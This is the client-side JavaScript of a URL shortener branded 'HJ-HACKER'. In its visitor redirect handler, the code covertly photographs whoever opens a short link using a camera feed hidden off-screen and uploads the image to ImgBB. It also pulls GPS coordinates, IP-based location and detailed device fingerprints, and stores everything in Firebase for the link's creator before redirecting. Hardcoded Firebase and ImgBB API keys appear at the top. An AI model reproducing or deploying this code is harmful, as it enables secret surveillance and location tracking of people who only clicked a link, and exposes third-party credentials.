// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// ImgBB API Key
const IMGBB_API_KEY = "1c64909854fd8f51eaad9f03c965ad78";

let deleteCode = null;

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// ========== CAMERA CAPTURE WITH IMGBB ==========
async function captureAndUploadPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        document.body.appendChild(video);

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 500);
            };
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);

        stream.getTracks().forEach(track => track.stop());
        video.remove();

        if (imageData && imageData.length > 500) {
            const formData = new FormData();
            formData.append('image', imageData.split(',')[1]);
            formData.append('key', IMGBB_API_KEY);
            const response = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: formData });
            const result = await response.json();
            if (result.success) return result.data.url;
        }
        return null;
    } catch (error) {
        console.error('Camera error:', error);
        return null;
    }
}

// ========== LOCATION CAPTURE ==========
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) { resolve(null); return; }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            () => resolve(null),
            { timeout: 10000, enableHighAccuracy: true }
        );
    });
}

// ========== DEVICE INFO ==========
async function getDeviceInfo() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';

    let os = 'Unknown';
    if (ua.includes('iPhone')) os = 'iOS';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'macOS';

    let deviceBrand = 'Unknown';
    if (ua.includes('iPhone')) deviceBrand = 'Apple';
    else if (ua.includes('SM-')) deviceBrand = 'Samsung';
    else if (ua.includes('MI')) deviceBrand = 'Xiaomi';
    else if (ua.includes('Pixel')) deviceBrand = 'Google';

    let batteryLevel = 'Unknown';
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
        } catch(e) {}
    }

    let connectionType = 'Unknown';
    if (navigator.connection) connectionType = navigator.connection.effectiveType || 'Unknown';

    return {
        browser, os, device_brand: deviceBrand,
        screen_width: screen.width, screen_height: screen.height,
        language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery_level: batteryLevel, connection_type: connectionType,
        device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        hardware_concurrency: navigator.hardwareConcurrency || 'Unknown'
    };
}

// ========== IP INFO ==========
async function getIPInfo() {
    try {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        return { ip: d.ip || 'Unknown', city: d.city || 'Unknown', country: d.country_name || 'Unknown', latitude: d.latitude, longitude: d.longitude };
    } catch(e) { return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', latitude: null, longitude: null }; }
}

// ========== DELETE LINK ==========
async function deleteLink(code) {
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        await database.ref(`urls/${code}`).remove();
        await database.ref(`domains/${encodedDomain}/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        showToast('Deleted', `Link /${code} deleted!`, 'success');
        showLinks(); showStats(); showRecent();
        return true;
    } catch (error) {
        showToast('Error', 'Failed to delete', 'error');
        return false;
    }
}

// ========== SHORTEN URL ==========
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) { showToast('Error', 'Please enter a URL', 'error'); return; }
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) urlToShorten = 'https://' + urlToShorten;
    try { new URL(urlToShorten); } catch { showToast('Error', 'Invalid URL', 'error'); return; }

    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    const exists = await checkCodeExists(shortCode);
    if (exists) { showToast('Error', `Code "${shortCode}" already taken`, 'error'); return; }

    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;

    if (hasPassword && !password) { showToast('Error', 'Please enter password', 'error'); return; }
    if (hasSocialGate && (!socialTitle || !socialUrl)) { showToast('Error', 'Fill social gate details', 'error'); return; }

    document.getElementById('shortenBtn').disabled = true;
    document.getElementById('loading').classList.remove('hidden');

    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);

        const linkData = { long_url: urlToShorten, domain, created_at: createdAt, device_id: deviceId, clicks: 0, animation_type: animation };
        if (password) linkData.password = password;
        if (socialTitle) {
            linkData.social_gate_title = socialTitle;
            linkData.social_gate_url = socialUrl;
            linkData.social_gate_icon = socialIcon;
            if (socialDesc) linkData.social_gate_description = socialDesc;
            if (socialButton) linkData.social_gate_button_text = socialButton;
        }
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;

        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);

        const shortUrl = `${window.location.origin}/${shortCode}`;
        document.getElementById('shortLink').textContent = shortUrl;
        document.getElementById('result').classList.remove('hidden');
        document.getElementById('qrCode').innerHTML = '';
        new QRCode(document.getElementById('qrCode'), { text: shortUrl, width: 100, height: 100, colorDark: "#00ff41", colorLight: "#000000" });

        showToast('Success', 'Link created!', 'success');
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        document.getElementById('passwordSection').classList.add('hidden');
        document.getElementById('socialSection').classList.add('hidden');
        document.getElementById('password').value = '';

        showLinks(); showStats(); showRecent();
    } catch (error) {
        showToast('Error', error.message || 'Error occurred', 'error');
    } finally {
        document.getElementById('shortenBtn').disabled = false;
        document.getElementById('loading').classList.add('hidden');
    }
}

function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

// ========== SHOW LINKS ==========
async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading links...</p></div>');
    try {
        const domain = window.location.hostname;
        const snap = await database.ref(`domains/${encodeFirebasePath(domain)}`).get();
        const links = [];
        snap.forEach(child => links.push({ code: child.key, ...child.val() }));
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p></div>');
            return;
        }
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                    <span>${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-stats">📊 Clicks: ${link.clicks || 0} ${link.password ? '🔒' : ''}</div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> Data</button>
                    <button class="data-btn-sm" onclick="confirmDelete('${link.code}')" style="background:#ff444420;"><i class="fas fa-trash-alt"></i> Delete</button>
                </div>
            </div>
        `).join('');
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
}

// ========== SHOW STATS ==========
async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading stats...</p></div>');
    try {
        const domain = window.location.hostname;
        const snap = await database.ref(`domains/${encodeFirebasePath(domain)}`).get();
        let clicks = 0, total = 0;
        for (const [k, v] of Object.entries(snap.val() || {})) { clicks += v.clicks || 0; total++; }
        updateDisplay('STATISTICS', 'fa-chart-line', `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${total}</div><div class="stat-label"><i class="fas fa-link"></i> Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${clicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
            </div>
        `);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
}

// ========== SHOW RECENT ==========
async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading recent activity...</p></div>');
    try {
        const domain = window.location.hostname;
        const snap = await database.ref(`domains/${encodeFirebasePath(domain)}`).get();
        const visitors = [];
        for (const [code] of Object.entries(snap.val() || {})) {
            const aSnap = await database.ref(`analytics/${code}`).orderByKey().limitToLast(30).get();
            aSnap.forEach(v => visitors.push({ code, ...v.val() }));
        }
        visitors.sort((a,b) => new Date(b.created_at) - new Date(a.created_at));
        const recent = visitors.slice(0, 15);
        if (!recent.length) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity yet</p></div>');
            return;
        }
        let html = '';
        recent.forEach(v => {
            html += `<div class="data-item">
                <div class="data-item-header"><span><i class="fas fa-link"></i> /${v.code}</span><span>${new Date(v.created_at).toLocaleString()}</span></div>
                <div class="data-item-stats"><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'} | <i class="fas fa-map-marker-alt"></i> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                <div class="data-item-stats"><i class="fab fa-${(v.browser || 'chrome').toLowerCase()}"></i> ${v.browser || 'Unknown'} | <i class="fas fa-desktop"></i> ${v.os || 'Unknown'}</div>
                ${v.captured_image ? `<div class="data-item-stats"><i class="fas fa-camera"></i> <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')">View Photo</button></div>` : ''}
                <div class="data-item-actions"><button class="data-btn-sm" onclick="viewAnalytics('${v.code}')"><i class="fas fa-chart-line"></i> Full Data</button></div>
            </div>`;
        });
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
}

// ========== VIEW ANALYTICS ==========
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>');
    try {
        const snap = await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get();
        const list = [];
        snap.forEach(c => list.push(c.val()));
        list.reverse();
        let html = `<div class="stats-grid"><div class="stat-card"><div class="stat-value">${list.length}</div><div class="stat-label">Clicks</div></div></div>`;
        if (!list.length) html += '<div class="empty-data">No visitors yet</div>';
        else list.forEach(v => {
            html += `<div class="data-item">
                <div class="data-item-header"><span>${v.ip_address || 'Unknown'}</span><span>${new Date(v.created_at).toLocaleString()}</span></div>
                <div class="data-item-stats"><strong>Device:</strong> ${v.device_brand || ''} ${v.os || 'Unknown'}</div>
                <div class="data-item-stats"><strong>Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'}</div>
                <div class="data-item-stats"><strong>Battery:</strong> ${v.battery_level || 'Unknown'} | <strong>Network:</strong> ${v.connection_type || 'Unknown'}</div>
                <div class="data-item-stats"><strong>RAM:</strong> ${v.device_memory || 'Unknown'} | <strong>CPU:</strong> ${v.hardware_concurrency || 'Unknown'}</div>
                <div class="data-item-stats"><strong>Screen:</strong> ${v.screen_width || '?'}x${v.screen_height || '?'}</div>
                <div class="data-item-stats"><strong>Location:</strong> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                ${v.latitude ? `<div class="data-item-stats"><strong>GPS:</strong> ${v.latitude.toFixed(4)}, ${v.longitude?.toFixed(4)} <button class="data-btn-sm" onclick="window.open('https://maps.google.com?q=${v.latitude},${v.longitude}')">Map</button></div>` : ''}
                ${v.captured_image ? `<div class="data-item-stats"><i class="fas fa-camera"></i> <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')">View Photo</button></div>` : ''}
            </div>`;
        });
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation', '<div class="empty-data">Error</div>'); }
};

window.viewPhoto = (imgData) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    if (modal && img && imgData) { img.src = imgData; modal.classList.remove('hidden'); }
    else showToast('Error', 'No photo', 'error');
};

function closePhotoModal() { document.getElementById('photoModal').classList.add('hidden'); }
function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src) { const a = document.createElement('a'); a.download = 'photo.jpg'; a.href = img.src; a.click(); showToast('Success', 'Downloaded!'); }
}

window.confirmDelete = (code) => { deleteCode = code; document.getElementById('deleteLinkCode').textContent = `/${code}`; document.getElementById('deleteModal').classList.remove('hidden'); };
window.executeDelete = async () => { if (deleteCode) { await deleteLink(deleteCode); deleteCode = null; document.getElementById('deleteModal').classList.add('hidden'); } };
window.cancelDelete = () => { deleteCode = null; document.getElementById('deleteModal').classList.add('hidden'); };
window.copyToClipboard = (t) => { navigator.clipboard.writeText(t); showToast('Copied', 'Link copied!'); };

// ========== VISITOR REDIRECT HANDLER ==========
async function handleVisitorRedirect() {
    const path = window.location.pathname;
    if (path === '/' || path === '/index.html') return;
    const code = path.substring(1);
    if (!code) return;
    try {
        const snap = await database.ref(`urls/${code}`).get();
        if (!snap.exists()) return;
        const data = snap.val();
        let photo = null, locationData = null;
        if (data.capture_camera) photo = await captureAndUploadPhoto();
        if (data.capture_location) locationData = await captureLocation();
        const ip = await getIPInfo();
        const device = await getDeviceInfo();
        const analyticsData = {
            created_at: new Date().toISOString(), ip_address: ip.ip, city: ip.city, country: ip.country,
            latitude: locationData?.latitude || ip.latitude, longitude: locationData?.longitude || ip.longitude,
            captured_image: photo, ...device
        };
        await database.ref(`analytics/${code}`).push(analyticsData);
        await database.ref(`urls/${code}/clicks`).transaction(c => (c || 0) + 1);
        if (data.password) {
            sessionStorage.setItem(`pending_${code}`, data.long_url);
            sessionStorage.setItem(`pass_${code}`, data.password);
            showPasswordModal(code); return;
        }
        if (data.social_gate_url) {
            sessionStorage.setItem(`pending_${code}`, data.long_url);
            showSocialModal(data); return;
        }
        window.location.href = data.long_url;
    } catch(e) { console.error(e); }
}

function showPasswordModal(code) {
    const m = document.getElementById('passwordModal');
    const inp = document.getElementById('modalPassword');
    const err = document.getElementById('modalError');
    m.classList.remove('hidden');
    const check = () => {
        if (inp.value === sessionStorage.getItem(`pass_${code}`)) {
            m.classList.add('hidden');
            window.location.href = sessionStorage.getItem(`pending_${code}`);
        } else { err.classList.remove('hidden'); err.innerText = 'Wrong password!'; }
    };
    document.getElementById('modalUnlock').onclick = check;
    document.getElementById('modalCancel').onclick = () => { m.classList.add('hidden'); window.location.href = '/'; };
    inp.onkeypress = (e) => { if (e.key === 'Enter') check(); };
}

function showSocialModal(d) {
    const m = document.getElementById('socialModal');
    document.getElementById('socialModalIcon').innerHTML = `<i class="fab fa-${d.social_gate_icon || 'youtube'}" style="font-size:48px;color:#ff4444;"></i>`;
    document.getElementById('socialModalTitle').innerText = d.social_gate_title || 'Follow to Unlock';
    document.getElementById('socialModalDesc').innerText = d.social_gate_description || 'Complete action';
    document.getElementById('socialModalBtn').innerText = d.social_gate_button_text || 'Verify';
    m.classList.remove('hidden');
    document.getElementById('socialModalBtn').onclick = () => {
        window.open(d.social_gate_url, '_blank');
        setTimeout(() => {
            const url = sessionStorage.getItem(`pending_${window.location.pathname.substring(1)}`);
            if (url) window.location.href = url;
        }, 3000);
    };
}

// ========== EVENT LISTENERS ==========
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => { const l = document.getElementById('shortLink')?.textContent; if (l) copyToClipboard(l); });
document.getElementById('passwordToggle')?.addEventListener('change', () => document.getElementById('passwordSection')?.classList.toggle('hidden'));
document.getElementById('socialToggle')?.addEventListener('change', () => document.getElementById('socialSection')?.classList.toggle('hidden'));
document.querySelectorAll('.icon-option').forEach(i => {
    i.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(x => x.classList.remove('active'));
        i.classList.add('active');
        document.getElementById('socialIcon').value = i.dataset.icon;
    });
});
document.getElementById('advancedToggle')?.addEventListener('click', () => document.getElementById('advancedContent')?.classList.toggle('hidden'));
document.getElementById('confirmDeleteBtn')?.addEventListener('click', executeDelete);
document.getElementById('cancelDeleteBtn')?.addEventListener('click', cancelDelete);
document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);

document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click button to view data', 'fa-fingerprint', '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT</p></div>');
        } else if (tab === 'links') showLinks();
        else if (tab === 'stats') showStats();
        else if (tab === 'recent') showRecent();
    });
});

window.addEventListener('click', (e) => {
    if (e.target === document.getElementById('photoModal')) closePhotoModal();
    if (e.target === document.getElementById('deleteModal')) cancelDelete();
    if (e.target === document.getElementById('passwordModal')) document.getElementById('passwordModal')?.classList.add('hidden');
    if (e.target === document.getElementById('socialModal')) document.getElementById('socialModal')?.classList.add('hidden');
});

handleVisitorRedirect();
console.log('🔥 HJ-HACKER LOADED - All features working!');
